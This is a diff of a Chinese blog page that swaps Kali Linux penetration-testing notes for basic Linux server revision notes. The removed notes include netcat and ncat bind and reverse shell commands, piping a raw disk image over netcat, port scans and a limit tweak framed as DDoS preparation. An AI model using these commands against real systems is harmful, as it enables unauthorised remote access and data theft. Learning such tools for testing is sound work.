@@ -6,15 +6,14 @@
 
 <head><meta name="generator" content="Hexo 3.9.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="kali, 渗透测试,C,SQL注入,XSS注入,文件上传漏洞等">
+    <meta name="keywords" content="linux服务器, 渗透测试,C,SQL注入,XSS注入,文件上传漏洞等">
     <meta name="baidu-site-verification" content="fmlEuI34ir">
     <meta name="google-site-verification" content="KeoTn_OFy4ndJwXNmm2gMeQfPhd7alqE9vQDwI32KCY">
-    <meta name="description" content="Kali Linux（安全牛学习）渗透测试准备基础静态IP配置修改文件/etc/network/interface
-allow-htoplug eth0
-
-iface eht0 inet static
-
-address 192.168.0.">
+    <meta name="description" content="Linux服务器复习第一章 Linux基础知识1、Linux最早是由Linus Torvalds开发的
+2、自由软件与免费软件；自由软件是完全免费，可修改可商用，免费软件可使用不可商用
+3、基本的linux命令
+cd：切换目录；
+ls：列出">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -22,7 +21,7 @@ address 192.168.0.">
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>kali | Dusk</title>
+    <title>linux服务器 | Dusk</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -474,13 +473,13 @@ address 192.168.0.">
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/3.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/8.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        kali
+                        linux服务器
                     </div>
                 </div>
             </div>
@@ -592,8 +591,8 @@ address 192.168.0.">
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/kali/" target="_blank">
-                                <span class="chip bg-color">kali</span>
+                            <a href="/tags/linux/" target="_blank">
+                                <span class="chip bg-color">linux</span>
                             </a>
                         
                     </div>
@@ -604,8 +603,8 @@ address 192.168.0.">
                     <div class="post-cate">
                         <i class="fa fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/kali/" class="post-category" target="_blank">
-                                kali
+                            <a href="/categories/linux/" class="post-category" target="_blank">
+                                linux
                             </a>
                         
                     </div>
@@ -616,7 +615,7 @@ address 192.168.0.">
             <div class="post-info">
                 <div class="post-date info-break-policy">
                     <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-08-18
+                    2020-08-26
                 </div>
 
                 <div class="post-author info-break-policy">
@@ -630,14 +629,14 @@ address 192.168.0.">
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        3.7k
+                        4k
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        16 分
+                        15 分
                     </div>
                     
                 
@@ -654,302 +653,193 @@ address 192.168.0.">
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="Kali-Linux（安全牛学习）"><a href="#Kali-Linux（安全牛学习）" class="headerlink" title="Kali Linux（安全牛学习）"></a>Kali Linux（安全牛学习）</h1><h2 id="渗透测试准备基础"><a href="#渗透测试准备基础" class="headerlink" title="渗透测试准备基础"></a>渗透测试准备基础</h2><h3 id="静态IP配置"><a href="#静态IP配置" class="headerlink" title="静态IP配置"></a>静态IP配置</h3><p>修改文件/etc/network/interface</p>
-<pre><code>allow-htoplug eth0
-
-iface eht0 inet static
-
-address 192.168.0.1
-
-netmask 255.255.255.0
-
-gateway 192.168.0.254
-dns-nameservers 192.168.0.10 192.168.0.20</code></pre><h3 id="更新升级"><a href="#更新升级" class="headerlink" title="更新升级"></a>更新升级</h3><p>因为kali linux经常更新软件包，所以需要时刻保持系统是最新版的</p>
-<p>更新系统的命令是</p>
-<pre><code>#apt-get update     #更新软件包的索引文件
-如果更新索引文件出现异常则用下面的命令
-#apt-get update --fix-missing
-
-#apt-get upgrade    #更新软件包文件</code></pre><p>更改软件包的更新源<br>科技大学更新源</p>
-<pre><code>deb http://mirrors.ustc.edu.cn/kali kali main non-free contrib
-deb-src http://mirrors.ustc.edc.cn/kali kali main non-free contrib
-deb http://mirrors.ustc.edu.cn/kali-security kali/updates main contrib non-free</code></pre><p>版本更新</p>
-<pre><code>#apt-get dis-upgrade</code></pre><p>重复执行</p>
-<h3 id="安装软件包"><a href="#安装软件包" class="headerlink" title="安装软件包"></a>安装软件包</h3><pre><code>#apt-get install smplayer ibus ibus-pinyin flashplugin-nonfree gdebi amule qbittorrent geany stardict meld fff-way -microhei kchmviewer freemind netspeed mtr filezilla filezilla-common chromium monodevelop mono-gmcs -y</code></pre><p>图形化软件安装包程序</p>
-<pre><code>#dpkg -i asd.deb</code></pre><h3 id="浏览器插件"><a href="#浏览器插件" class="headerlink" title="浏览器插件"></a>浏览器插件</h3><p>安装浏览器插件是为了以后的web渗透所准备的</p>
-<p>Firefox浏览器插件</p>
-<p>flashgot、autoproxy、Tamper Data、cookie importer、Cookies Manager、User Agent Switcher、HackBar、Live http header、Firebug、Download YouTube Videos as MP4、Flagfox、hashr</p>
-<p> 安装方法</p>
-<p>打开浏览器按ALT键打开菜单，下拉Tools，点击addons，然后搜索即可。</p>
-<p>SQL inject Me和XSS Me 通过以下两个网址安装，直接download即可。</p>
-<p><a href="https://addons.mozilla.org/en-US/firefox/addon/xss-me/" target="_blank" rel="noopener">https://addons.mozilla.org/en-US/firefox/addon/xss-me/</a></p>
-<p><a href="https://addons.mozilla.org/en-US/firefox/addon/sql-inject-me/$src=ss" target="_blank" rel="noopener">https://addons.mozilla.org/en-US/firefox/addon/sql-inject-me/$src=ss</a></p>
-<h3 id="安装JAVA"><a href="#安装JAVA" class="headerlink" title="安装JAVA"></a>安装JAVA</h3><p>下载安装包</p>
-<p><a href="http://java.sun.com/javase/downloads/index.jsp" target="_blank" rel="noopener">http://java.sun.com/javase/downloads/index.jsp</a></p>
-<p>解压安装包  tar -zxvf ############ ，然后将解压出来的目录移动到/usr/bin目录下#mv jdk1.8.0_45 /usr/bin，#cd /usr/bin/jdk1.8.0_45然后安装注册</p>
-<pre><code>#update-alternatives --install /usr/bin/java java /opt/jdk1.8.0_45/bin/java 1
-#update-alternatives --install /usr/bin/javac javac /opt/jdk1.8.0_45/bin/javac 1
-#update-alternatives --install /usr/lib/mozilla/plugins/libjavaplugin.so mozilla-javaplugin.so /opt/jdk1.8.0_45/jre/lib/amd64/linpjp2.so 1</code></pre><p>使注册默认生效（默认设置）</p>
-<pre><code>#update-alternatives --set java /opt/jdk1.8.0_45/bin/java
-#update-alternatives --set javac /opt/jdk1.8.0_45/bin/javac
-#update-alternatives --set mozilla-javaplugin.so /opt/jdk1.8.0_45/jre/lib/amd64/libnpjp2.so</code></pre><p>验证</p>
-<pre><code>#java -version</code></pre><p>在<a href="http://www.java.com/en/download/installed.jsp验证java安装是否完成。" target="_blank" rel="noopener">http://www.java.com/en/download/installed.jsp验证java安装是否完成。</a></p>
-<p>方法2：</p>
-<p>​    将文件夹放在/opt目录下，修改文件/etc/profile，在底部加上以下内容</p>
-<pre><code>JAVA_HOME=/opt/jdk1.8.0_131　　　#把值修改成自己的路径
-CLASSPATH=.:$JAVA_HOME/lib.tools.jar
-PATH=$JAVA_HOME/bin:$PATH
-export JAVA_HOME CLASSPATH PATH</code></pre><p>然后更新一下#source /etc/profile</p>
-<h3 id="安装显卡驱动"><a href="#安装显卡驱动" class="headerlink" title="安装显卡驱动"></a>安装显卡驱动</h3><p>GPU的用途        Nvidia         Ati</p>
-<p>显卡有上千核，可以很有效的进行一些暴力破解</p>
-<p>NVIDIA显卡驱动安装</p>
-<pre><code>#apt-get update
-#apt-get dist-upgrade
-#apt-get install -y linux-headers-$(uname -r)
-#apt-get install nvidia-kernel-dkms
-#sed 's/quiet/quiet nouveau.modeset=0/g' -i /etc/default/grub
-#update-grub
-#reboot
-验证
-#glxinfo | grep -i "direct rendering"
-显示yes即成功</code></pre><h3 id="无线网卡补丁"><a href="#无线网卡补丁" class="headerlink" title="无线网卡补丁"></a>无线网卡补丁</h3><p>最新版内核已经集成无线驱动补丁</p>
-<pre><code>#uname -a      #查看内核版本</code></pre><p>如果是老版本内核</p>
-<pre><code>#cd /usr/src/
-#wget https://www.kernel.org/pub/linux/kernel/projects/backports/stable/v3.12/backports-3.12-1.tar.bz2     #下载版本视内核情况而定
-#tar xvf backports-3.12-1.tar.bz2
-#cd backports-3.12-1
-#apt-get install patch
-#wegt http://patches.aircrack-ng.org/mac80211.compat08082009.wl_frag+ack_vl.patch
-#patch -pl&lt;mac80211.compat08082009.wl_frag+ack_vl.patch&gt;
-#apt-get install libncurses5-dev
-#airmon-ng          #查看驱动
-#make defconfig-ath9k
-#make &amp;&amp; make install</code></pre><h3 id="并发线程限制"><a href="#并发线程限制" class="headerlink" title="并发线程限制"></a>并发线程限制</h3><p>为以后DDoS攻击做准备</p>
-<p>Ulimite用于限制<strong>当前</strong>shell内进程的资源使用</p>
-<p>查看默认值</p>
-<pre><code>#ulimit -a</code></pre><h4 id="用途距离"><a href="#用途距离" class="headerlink" title="用途距离"></a>用途距离</h4><p>​    ·限制 堆栈大小：#ulimit -s 100</p>
-<p>​    ·限制shell内存使用：#ulimit -m 5000 -v 5000</p>
-<p>修改root家目录下的.bashrc文件可以永久生效</p>
-<p>通过修改open files即#ulimit -n 90000000 来为之后的DDoS需要打开的文件做上限修改</p>
-<h3 id="电源优化"><a href="#电源优化" class="headerlink" title="电源优化"></a>电源优化</h3><p>·渗透测试系统耗电较大</p>
-<p>·延长电池寿命</p>
-<pre><code> ·无操作挂起、关闭显示器</code></pre><p>​     ·降低显示器亮度</p>
-<p>​     ·不使用时关闭无线网卡</p>
-<p>​     ·开启硬盘省电选项</p>
-<pre><code>#hdparm -i /dev/sda if AdvancedPM=yes then hdparm -B 1 -S 12 /dev/sda</code></pre><p> ·启动笔记本模式</p>
-<pre><code>笔记本模式脚本
-#!/bin/bash
-currrrentMode=$(cat /proc/sysvm/laptop_mode)
-if[$currentMode -eq 0]
-then
-echo "5" &gt; /proc/sys/vm/laptop_mode
-echo "Laptop Mode Enabled"
-else
-echo "0" &gt; /proc/sys/vm/laptop_mode
-echo "Laptop Mode Disabled"
-fi</code></pre><h3 id="服务开关"><a href="#服务开关" class="headerlink" title="服务开关"></a>服务开关</h3><p>kali linux默认未启动所有网络服务</p>
-<p>临时开启网络服务</p>
-<pre><code>#/etc/init.d/ssh start</code></pre><p>永久开启网络服务</p>
-<pre><code>#update-rc.d ssh default
-#update-rc.d ssh start 20 2 3 4 5 .stop 20 0 1 6 .
-运行级别0-6
-#update-rc.d A defaults 80 20     #80是启动优先级，20是关闭优先级
-#update-rc.d B defaults 90 10     #数值越大优先级越小</code></pre><h3 id="翻墙-amp-代理"><a href="#翻墙-amp-代理" class="headerlink" title="翻墙&amp;代理"></a>翻墙&amp;代理</h3><h4 id="GFW长城防火墙"><a href="#GFW长城防火墙" class="headerlink" title="GFW长城防火墙"></a>GFW长城防火墙</h4><p>​    ·Facebook、YouTube    </p>
-<h4 id="翻墙"><a href="#翻墙" class="headerlink" title="翻墙"></a>翻墙</h4><p>​    ·http代理        http是一个明文传输的协议容易被GFW所发现，他会更新自己的策略库来阻挡用户。但是可以用https对传输来进行加密。</p>
-<p>​    ·socks代理</p>
-<p>​    ·ssh隧道</p>
-<p>​    ·VPN</p>
-<h4 id="翻墙软件"><a href="#翻墙软件" class="headerlink" title="翻墙软件"></a>翻墙软件</h4><p>​    ·Goagent （现在已经GoAgent已经成为过去式了）</p>
-<p>​        下载网址：<a href="https://cod.gode.google.com/p/goagent/或者https://github.com/goagent/goagent" target="_blank" rel="noopener">https://cod.gode.google.com/p/goagent/或者https://github.com/goagent/goagent</a>            </p>
-<p>​            ·注册：appengine.google.com</p>
-<p>​            过程：IE→goagent→GAE→目标网站</p>
-<p>ip138.com可以查看自己的公网地址</p>
-<p>​    ·<strong>Tor</strong>                <strong>暗网</strong></p>
-<h4 id="代理的意义所在"><a href="#代理的意义所在" class="headerlink" title="代理的意义所在"></a>代理的意义所在</h4><p>​    ·加密通信</p>
-<p>​    ·隐藏来源</p>
-<p>​    ·突破网络封锁</p>
-<h4 id="GOAGENT安装"><a href="#GOAGENT安装" class="headerlink" title="GOAGENT安装"></a>GOAGENT安装</h4><p>在kali linux系统下</p>
-<p>​    ·依赖数据包</p>
-<pre><code>#apt-get install python-dev python-greenlet python-gevent python-vte python-openssl python-crypto python-appindicator python-pip libnss3-lools
-</code></pre><pre><code>#pip install pyOpenSSL
-#pip install gevent --upgrade
-#mkdir -p ~/.pki/nssdb
-#certutil -d sql:$HOME/.pki/nssdb -N  #提示输入密码，两次回车，什么也不输入
-</code></pre><h5 id="配置浏览器"><a href="#配置浏览器" class="headerlink" title="配置浏览器"></a>配置浏览器</h5><p>配置证书：打开浏览器，按ALT键，下拉Edit，点击Preferences，点击Advanced，再点击Certificates，再点击View Certificates，选择到Authorities，点击import，找到Agent文件夹里面的CA.crt，然后三个信任勾选，一直OK即可。</p>
-<p>安装了add-ons插件之后，浏览器上方会有一个<strong>福</strong>字，点击福字右边的下拉，选择首选项，选择代理服务器，选择编辑代理服务器，里面有GoAgent即可。再点击下拉框点击默认代理，选择GoAgent。点击下拉框选择全局模式。</p>
-<p>运行GoAgent，查看，显示白字都没问题，即可使用。</p>
-<h3 id="TOR"><a href="#TOR" class="headerlink" title="TOR"></a>TOR</h3><p>保护隐私防止被追踪</p>
-<p>志愿者组成的网络中转节点</p>
-<p>暗网</p>
-<p>​    ·互联网搜索引擎无法发现</p>
-<p>​    ·互联网黑市</p>
-<p>下载和看视频是不道德的行为</p>
-<p>下载：<a href="https://www.torproject.org/download/download-easy.html.en#linux" target="_blank" rel="noopener">https://www.torproject.org/download/download-easy.html.en#linux</a>     </p>
-<p>​            需要翻墙</p>
-<p>​    ·问题1：should not be run as root；</p>
-<p>​    ·问题2：服务启动错误</p>
-<p>暗网wiki</p>
-<p>​    ·<a href="http://zpktlwi4fecvo6ri.onion/wiki/index.php/Main_Page" target="_blank" rel="noopener">http://zpktlwi4fecvo6ri.onion/wiki/index.php/Main_Page</a></p>
-<p>暗网里的网站都是以onion为域名</p>
-<p>下载好软件包，进入文件夹，点击Tor Browser Setup，会报错，进入Browser目录，找到start-tor-browser，编辑它，搜索root，找到一行关于报错判断的语句，把判断eq后面的0改为任何数字，保存即可。但是会有另一个错误，是权限造成的，修改文件夹的所有者和所有组为root，#chown  R root:root tor-browser_zh-CN，双击即可运行，点击连接是无法连接成功的，点击配置，ISP是否对Tor进行了封锁选择<strong>是</strong>，然后下一步，使用集成的网桥进行连接，选择meek-azure或meek-google或者meek-amazon都可以，这一步是选择云，下一步，是否需要本地代理访问互联网，选择否，点击连接。</p>
-<p>使用Tor的集成浏览器，最大化Tor Browser窗口之后，网站可获取显示器尺寸信息，从而可跟踪用户。</p>
-<p>可以通过#netstat -pantu | grep tor    来查看后台客户端tor在侦听的端口。</p>
-<h4 id="代理设置"><a href="#代理设置" class="headerlink" title="代理设置"></a>代理设置</h4><p>可以修改apt-get的配置文件，使apt-get update 更新时使用代理来访问国外的源。</p>
-<pre><code>#vi /etc/apt/apt.conf
-    Acquire::http::Proxy"http://127.0.0.1:8087";
-
-    也可以加入以下配置
-    Acquire::ftp::Proxy"ftp://127.0.0.1:8087/";
-    Acquire::https::Proxy"ftp://127.0.0.1:8087/";
-    Acquire::socks::Proxy"ftp://127.0.0.1:8087/";
-</code></pre><p>编辑/etc/bash.bashrc可以使命令也可以用代理，如下：</p>
-<pre><code>#vi /etc/bash.bashrc
-    export http_proxy="http://127.0.0.1:8087"
-</code></pre><p>可以使用curl 加一个网页来验证是否代理</p>
-<h4 id="代理链"><a href="#代理链" class="headerlink" title="代理链"></a>代理链</h4><p>通过编辑/etc/proxychains.conf  可以进行动态代理，静态代理和随机代理</p>
-<h3 id="实验环境搭建"><a href="#实验环境搭建" class="headerlink" title="实验环境搭建"></a>实验环境搭建</h3><p>微软最新版软件</p>
-<p>​    <a href="http://msdn.microsoft.com/en-ca/subscriptions/aa336858" target="_blank" rel="noopener">http://msdn.microsoft.com/en-ca/subscriptions/aa336858</a></p>
-<p>windows虚拟机</p>
-<p>​    <a href="http://dev.modern.ie/tools/vms/" target="_blank" rel="noopener">http://dev.modern.ie/tools/vms/</a></p>
-<p>安装自己的虚拟机</p>
-<p>​    xp；win7；2003</p>
-<p>linux虚拟机</p>
-<p>​    <a href="http://www.turnkeylinux.org" target="_blank" rel="noopener">http://www.turnkeylinux.org</a></p>
-<p>​    Ubuntu</p>
-<p>​        Lamp安装</p>
-<p>Metasploitable2</p>
-<p>​    <a href="http://downloads.metasploit.com/data/metasploitable/metasploitable-linux-2.0.0.zip" target="_blank" rel="noopener">http://downloads.metasploit.com/data/metasploitable/metasploitable-linux-2.0.0.zip</a></p>
-<p>​    问题：/var/www/mutillidae/config.inc</p>
-<p>​        dbname=owasp10</p>
-<br>
-
-<h2 id="渗透工具"><a href="#渗透工具" class="headerlink" title="渗透工具"></a>渗透工具</h2><h3 id="基本工具"><a href="#基本工具" class="headerlink" title="基本工具"></a>基本工具</h3><h4 id="NETCAT——NC"><a href="#NETCAT——NC" class="headerlink" title="NETCAT——NC"></a>NETCAT——NC</h4><h5 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h5><p>​    可以取代Telnet/获取banner信息</p>
-<p>​    网络工具中的瑞士军刀——小身材、大智慧</p>
-<p>​    侦听模式/传输模式</p>
-<p>​    传输文本信息</p>
-<p>​    传输文件/目录</p>
-<p>​    加密传输文件</p>
-<p>​    远程控制/木马</p>
-<p>​    加密所有流量</p>
-<p>​    流媒体服务器</p>
-<p>​    远程克隆硬盘</p>
-<h5 id="TELNET-BANNER"><a href="#TELNET-BANNER" class="headerlink" title="TELNET/BANNER"></a>TELNET/BANNER</h5><p>​    nc -nv 1.1.1.1 110        </p>
-<p>​    nc -nv 1.1.1.1 25            SMTP</p>
-<p>​    nc -nv 1.1.1.1 80            Web</p>
-<p>​    nc -h       可以查看nc可用参数</p>
-<h5 id="传输文本信息"><a href="#传输文本信息" class="headerlink" title="传输文本信息"></a>传输文本信息</h5><p>​    A：nc -l -p 4444        -p是指定端口号；两个电脑要相互通信需要开放一个端口</p>
-<p>​    B：nc -nv 1.1.1.1 4444        1.1.1.1是电脑A的ip地址</p>
-<p>连接成功后两台电脑就可以聊天了</p>
-<p>电子取证</p>
-<p>​    在电脑B上输入#ls -l | nc -nv 1.1.1.1 4444  会在电脑A上显示结果，而电脑B上不会显示；在电脑A上输入#nc -l -p 4444 &gt; ps.txt 从外来的显示内容会存储在ps.txt</p>
-<p>传输文件</p>
-<p>​    A：nc -lp 333 &gt; 1.mp4                    A在这里是文件的接收端</p>
-<p>​    B：nc -nv 1.1.1.1 333 &lt; 1.mp4 -q 1                    -q 1：的意思是传输之后一秒后断开</p>
-<p>​    或者</p>
-<p>​    A：nc -q 1 -lp 333 &lt; a.mp4 -q 1            把a.mp4这个文件放在333端口里等别人来连接</p>
-<p>​            A在这里是文件的发送端</p>
-<p>​    B： nc -nv 1.1.1.1 333 &gt; b.mp4</p>
-<p>传输目录</p>
-<p>​    A：tar -cvf  -  music/  |  nc -lp 333 -q 1</p>
-<p>​    B： nc -nv 1.1.1.1 333  | tar -xvf -</p>
-<p>加密传文件</p>
-<p>​    A：nc -lp 333 | mcrypt –flush -Fbqd -a rijndael-256 -m ecb &gt; 1.mp4            这里A是接收端</p>
-<p>​    B：mcrypt –flush -Fbq -a rijndael-256 -m ecb &lt; a.mp4 | nc -nv 1.1.1.1 333 -q 1</p>
-<p>​            因为要加密所以运行命令后需要输入两次密码</p>
-<p>​            在B端进行文件的加密在A端进行解密</p>
-<h5 id="流媒体服务"><a href="#流媒体服务" class="headerlink" title="流媒体服务"></a>流媒体服务</h5><p>​    A：cat 1.mp4 | nc -lp 333</p>
-<p>​    B：nc -nv  1.1.1.1 333 | mplayer -vo x11 -cache 3000 -</p>
-<p>​        从A端流过来多少媒体，B端就播放多少</p>
-<h5 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h5><p>​    nc -nvz 1.1.1.1 1-65535                -z：扫描模式  zero-I/O</p>
-<p>​    nc -vnzu 1.1.1.1 1-1024                -u：探测UDP端口</p>
-<p>默认情况下nc是使用TCP进行探测的</p>
-<h5 id="远程克隆硬盘"><a href="#远程克隆硬盘" class="headerlink" title="远程克隆硬盘"></a>远程克隆硬盘</h5><p>​    A：nc -lp 333 | dd of =/dev/sda</p>
-<p>​    B： dd if =/dev/sda | nc -nv 1.1.1.1 333 -q 1</p>
-<p>​    远程电子取证，可以将目标服务器硬盘远程复制，或者内存。</p>
-<h5 id="远程控制"><a href="#远程控制" class="headerlink" title="远程控制"></a>远程控制</h5><p>​    正向：    </p>
-<p>​        A：nc -lp 333 -c bash</p>
-<p>​        B：nc -nv 1.1.1.1 333            这里B机是控制端，A是被控制端</p>
-<p>​    反向：</p>
-<p>​        A：nc -lp 333                        这里A机是控制端，B是被控制端</p>
-<p>​        B：nc -nv  1.1.1.1 333 -c bash</p>
-<p>​    Windows用户bash改成cmd</p>
-<h5 id="NCAT"><a href="#NCAT" class="headerlink" title="NCAT"></a>NCAT</h5><p>​    缺点：</p>
-<p>​            Nc缺乏加密和身份验证的能力</p>
-<p>​    Ncat包含于nmap工具包中，是为了弥补nc无法加密的缺点而生成的</p>
-<p>​    A：ncat -c bash  –allow 192.168.20.14 -vnl 333 –ssl        这里A是被控端</p>
-<p>​    B：ncat -nv 1.1.1.1 333 –ssl                192.168.20.14是B的IP</p>
-<p>​    不同系统/平台的nc参数功能不尽相同</p>
-<p>​        nc所有的操作ncat都可以实现</p>
-<h4 id="WIRESHARK"><a href="#WIRESHARK" class="headerlink" title="WIRESHARK"></a>WIRESHARK</h4><p>​    抓包嗅探协议分析</p>
-<p>​    安全专家必备的技能</p>
-<p>​    抓包引擎</p>
-<p>​        Libpcap9——linux</p>
-<p>​        Winpcap10——Windows</p>
-<p>​    解码能力</p>
-<h5 id="筛选器"><a href="#筛选器" class="headerlink" title="筛选器"></a>筛选器</h5><p>​    过滤掉干扰的数据包</p>
-<p>​    抓包筛选器</p>
-<p>​    显示筛选器</p>
-<p>企业抓包部署方案</p>
-<p>​    Sniffer</p>
-<p>​    Cace/riverbed</p>
-<p>​    Casecad pilot    </p>
-<h4 id="TCPDUMP——抓包"><a href="#TCPDUMP——抓包" class="headerlink" title="TCPDUMP——抓包"></a>TCPDUMP——抓包</h4><p>​    tcpdump -h：可以查看有哪些参数</p>
-<p>​    -i：指定网卡</p>
-<p>​    -w：抓包的信息存储为一个文件，一般文件名用.pcap结尾</p>
-<p>​    -r：即read，显示文件内容</p>
-<p>​    -X：按照16进制来显示</p>
-<h5 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h5><p>​    默认只抓68个字节</p>
-<p>​    tcpdump -i eth0 -s 0 -w file.pcap</p>
-<p>​    tcpdump -i eth0 port 22</p>
-<h5 id="读取抓包文件"><a href="#读取抓包文件" class="headerlink" title="读取抓包文件"></a>读取抓包文件</h5><p>​    tcpdump -r file.pcap    </p>
-<h5 id="筛选"><a href="#筛选" class="headerlink" title="筛选"></a>筛选</h5><p>​    tcpdump -n -r http.cap | awk ‘{print $3}’ | sort -u</p>
-<p>​    tcpdump -n src host 145.254.160.237    -r http.cap</p>
-<p>​    tcpdump -n dst host 145.254.160.237 -r http.cap</p>
-<p>​    tcpdump -n port 53 -r http.cap</p>
-<p>​    tcpdimp -nX port 80 -r http.cap</p>
-<h5 id="高级筛选"><a href="#高级筛选" class="headerlink" title="高级筛选"></a>高级筛选</h5><p>tcpdump -A -n ‘tcp[13]=24’ -r http.cap</p>
-<p>显示tcp包第14个字节换算是24的数据包</p>
-<h5 id="过程文档记录"><a href="#过程文档记录" class="headerlink" title="过程文档记录"></a>过程文档记录</h5><p>Dradis</p>
-<p>​    ·短期临时小团队资源共享</p>
-<p>​    ·各种插件导入文件</p>
-<p>Keepnote</p>
-<p>Truecrypt                这是一个加密工具，但是已经不再更新了</p>
-<p>​    在kali的附件里面可以找到</p>
-<p>​    里面有一个选项：假如有人指着你的头，让你输入密码，你可以输入另一个密码，然后打开的是一个空的卷，这个卷是外部的卷，真正的文件在一个隐藏的地方，即隐藏的卷。</p>
-<h2 id="被动信息收集"><a href="#被动信息收集" class="headerlink" title="被动信息收集"></a>被动信息收集</h2><p>被动信息收集就是通过公开渠道可获得的信息</p>
-<p>与目标系统不产生直接交互；</p>
-<p>尽量避免留下一切痕迹；</p>
-<p>OSINT：</p>
-<p>​    美国军方：<a href="http://www.fas.org/irp/dodair/army/atp2-22.9.pdf" target="_blank" rel="noopener">http://www.fas.org/irp/dodair/army/atp2-22.9.pdf</a></p>
-<p>​    北大西洋公约组织：<a href="http://information-retrie.info/docs/NATO-OSINT.html" target="_blank" rel="noopener">http://information-retrie.info/docs/NATO-OSINT.html</a></p>
-<h3 id="信息收集内容："><a href="#信息收集内容：" class="headerlink" title="信息收集内容："></a>信息收集内容：</h3><p>IP地址段；</p>
-<p>域名信息；</p>
-<p>邮箱地址；</p>
-<p>文档图片数据；</p>
-<p>公司地址；</p>
-<p>公司组织架构；</p>
-<p>联系电话/传真号码；</p>
-<p>人员姓名/职务；</p>
-<p>目标系统是用的技术架构；</p>
-<p>公开的商业信息。</p>
-<h3 id="信息用途"><a href="#信息用途" class="headerlink" title="信息用途"></a>信息用途</h3><p>用信息描述目标；</p>
-<p>发现目标系统；</p>
-<p>社会工程学攻击；</p>
-<p>物理缺口。0</p>
-<h3 id="信息收集——DNS"><a href="#信息收集——DNS" class="headerlink" title="信息收集——DNS"></a>信息收集——DNS</h3><p>域名解析成IP地址</p>
-<p>域名与FQDN的区别</p>
-<p>​    例：域名：baidu.com；FQDN：<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a></p>
-<p>域名记录：A、Cnmae、NS、MX、ptr</p>
-<p>​    NS：域名服务器地址记录；</p>
-<p>​    MX：邮箱服务器地址记录；</p>
-<p>​    ptr：通过IP反向解析为域名记录</p>
-<h4 id="DNS信息收集——NSLooKup"><a href="#DNS信息收集——NSLooKup" class="headerlink" title="DNS信息收集——NSLooKup"></a>DNS信息收集——NSLooKup</h4><pre><code>例：
-nslookup www.sina.com
-set type=mx        #设定只查MX记录
-set    type=a        #设定只查a记录
-set    a=any        #查询任何类型
-server    2020.106.0.20    #可以更换域名服务器地址</code></pre><p>type可以用q代替</p>
-<h4 id="信息收集——DIG"><a href="#信息收集——DIG" class="headerlink" title="信息收集——DIG"></a>信息收集——DIG</h4><script>
+                <h1 id="Linux服务器复习"><a href="#Linux服务器复习" class="headerlink" title="Linux服务器复习"></a>Linux服务器复习</h1><h2 id="第一章-Linux基础知识"><a href="#第一章-Linux基础知识" class="headerlink" title="第一章 Linux基础知识"></a>第一章 Linux基础知识</h2><p>1、Linux最早是由Linus Torvalds开发的</p>
+<p>2、自由软件与免费软件；自由软件是完全免费，可修改可商用，免费软件可使用不可商用</p>
+<p>3、基本的linux命令</p>
+<p>cd：切换目录；</p>
+<p>ls：列出文件 或目录信息；</p>
+<p>cat：显示文件内容；</p>
+<p>pwd：显示当前目录的完整路径；</p>
+<p>mkdir：创建目录；</p>
+<p>rmdir：删除空目录；</p>
+<p>touch：新建普通文件；</p>
+<p>cp：复制文件或目录；</p>
+<p>mv：移动或更改文件和目录的名称；</p>
+<p>rm：删除文件或目录。</p>
+<p>linux分区最主要的两个：SWAP和根分区</p>
+<h2 id="第二章-用户管理"><a href="#第二章-用户管理" class="headerlink" title="第二章 用户管理"></a>第二章 用户管理</h2><p>用户的类型通过用户标识符UID来区分，<strong>系统中所有的用户UID具有唯一性</strong>，Linux有三种用户类型：</p>
+<p>系统管理员：root账户，UID为0，拥有对系统的最高访问权限，类似于Windows的administrator用户</p>
+<p>系统用户：为满足Linux系统管理所内建的账号，通常在安装过程中自动创建，不能用于登陆操作系统。UID在1-999之间，如bin、halt、mail账号等，一般不需要修改该类用户的默认设置；</p>
+<p>普通用户：由root管理员创建，供用户登录系统进行操作使用的账号，UID在1000以上，它类似于Windows系统中users用户组中的账户。</p>
+<h3 id="1、用户配置文件-etc-passwd"><a href="#1、用户配置文件-etc-passwd" class="headerlink" title="1、用户配置文件/etc/passwd"></a>1、用户配置文件/etc/passwd</h3><p>文件/etc/passwd以行为单位，每行以冒号分隔为7个数据域，保存用户的账号信息</p>
+<pre><code>user:x:1001:1001:user:/home/usr:/bin/bash</code></pre><p>上面的分别是</p>
+<pre><code>用户名：密码标志位：UID：GID：用户说明：家目录位置：默认shell</code></pre><h3 id="2、用户口令文件"><a href="#2、用户口令文件" class="headerlink" title="2、用户口令文件"></a>2、用户口令文件</h3><p>由于所有用户对/etc/passwd文件均有读取的权限，为了提高系统的安全性，Linux将用户口令通过算法进行加密，并移至/etc/shadow文件中保存。</p>
+<p>shadow文件中总共有9个字段，每个字段的含义如下：</p>
+<p>1：用户名；</p>
+<p>2：加密密码   加密算法升级为SHA512散列加密算法；</p>
+<p>3：密码最后一次修改日期；</p>
+<p>4：两次密码的修改间隔时间（和第3字段相比）；</p>
+<p>5：密码有效期（和第3字段比）</p>
+<p>6：密码修改到期前的警告天数（和第5字段比）；</p>
